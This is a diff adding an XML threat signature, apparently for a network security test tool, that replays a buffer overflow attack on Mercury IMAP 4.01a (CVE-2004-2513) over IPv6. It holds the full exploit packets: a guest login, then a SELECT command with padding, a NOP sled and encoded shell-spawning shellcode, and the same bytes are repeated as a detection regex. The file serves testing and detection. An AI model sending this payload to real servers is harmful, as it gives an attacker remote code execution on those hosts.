@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Mercury IMAP Buffer Overflow Attack (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat attempts to spawn a shell on a remote machine running Mercury IMAP.  Connects to the IMAP service, which runs on port 143. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="IMAP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="host"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Pegasus"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Pegasus_Mercury_Mail_Transport_System"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Pegasus_Mercury_Mail_Transport_System_4.01a"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://lists.netsys.com/pipermail/full-disclosure/2004-November/029629.html"/>
+    <CVEID display="true" value="CVE-2004-2513"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="50e8092b1143ef836f0143c0002efb29"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236796446"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X61\X30\X30\X31\X20\X53\X45\X4C\X45\X43\X54\X20\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\XFA\XC8\XF9\X01\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\XEB\X0F\X5B\X80\X33\X96\X43\X81\X3B\X45\X59\X34\X53\X75\XF4\X74\X05\XE8\XEC\XFF\XFF\XFF\X7E\XB2\X96\X96\X96\X22\XEB\X83\X0E\X5D\XD4\XE1\X2E\X4A\X4B\X8C\XA5\X7F\X2D\X55\X38\X50\XBD\X2B\XB8\X48\XC1\XE4\X32\XB2\X24\XA4\X96\X98\XCB\X5D\X48\XE2\XB4\XF5\X5E\XC9\XFC\XA6\XCD\XF2\X1D\X95\X1D\XD6\X9A\X1D\XE6\X8A\X3B\X1D\XFE\X9E\XFC\X92\XCF\X7E\X12\X96\X96\X96\X74\X6F\X23\X95\XBD\X77\XFE\XA5\XA4\X96\X96\XFE\XE1\XE5\XA4\XC9\XC2\X69\XC1\X6E\X03\XFC\X93\XCF\X7E\XF1\X96\X96\X96\X74\X6F\X1D\X61\XC7\XFE\X94\X96\X91\X2B\X1D\X7A\XC7\XC7\XC7\XC7\XFC\X97"/>
+    <Created value="1139461800" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="H"/>
+    <NamedVar name="IMAPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="C">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$IMAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="61303031204C4F47494E2067756573742067756573740A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$IMAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="613030312053454C454354204141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141FAC8F90190909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090EB0F5B80339643813B4559345375F47405E8ECFFFFFF7EB296969622EB830E5DD4E12E4A4B8CA57F2D553850BD2BB848C1E432B224A49698CB5D48E2B4F55EC9FCA6CDF21D951DD69A1DE68A3B1DFE9EFC92CF7E12969696746F2395BD77FEA5A49696FEE1E5A4C9C269C16E03FC93CF7EF1969696746F1D61C7FE9496912B1D7AC7C7C7C7FC97FC9469C06605FC86C3C569C062C6C569C06E1D6AFC98CF3D746BC6C6C569C06A3D3D3DF051D2B2BA97971D42FEF5FBF2961D5AC5C6C1C4A54DC5C5C5FC97C5C5C7C569C076FC6969A169C04A69C07A69C07A69C07EC71DE3AA1DE2B8EE9563C01DE0B69563A55FDFD73B9553A54DA544992886AC40E29E575D8D954CD67D79AD89E373C81DC8B2954BF01D9ADD1DC88A954B1D921D95533DCF55455934530D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="0,1,2,3">
+    <Output index="A" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2a204f4b205b4341504142494c49545920494d4150347265763120554944504c5553204348494c4452454e204e414d455350414345205448524541443d4f5244455245445355424a454354205448524541443d5245464552454e43455320534f52542051554f54412049444c452041434c2041434c323d554e494f4e205354415254544c535d0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="613031204f4b2055736572206c6f6767656420696e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="613032204f4b204c49535420636f6d706c657465640d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2a20464c4147532028244d444e53656e74204a756e6b204e6f6e4a756e6b2024466f7277617264656420244c6162656c3120447261667420416e73776572656420466c61676765642044656c65746564205365656e20526563656e74290d0a2a204f4b205b5045524d414e454e54464c4147532028244d444e53656e74204a756e6b204e6f6e4a756e6b2024466f7277617264656420244c6162656c31202a207261667420416e73776572656420466c61676765642044656c65746564205365656e295d204c696d697465640d0a2a2035393837204558495354530d0a2a203020524543454e540d0a2a204f4b205b55494456414c494449545920313133333931323636365d204f6b0d0a2a204f4b205b4d5952494748545320616364696c7273775d2041434c0d0a613033204f4b205b524541442d57524954455d204f6b0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
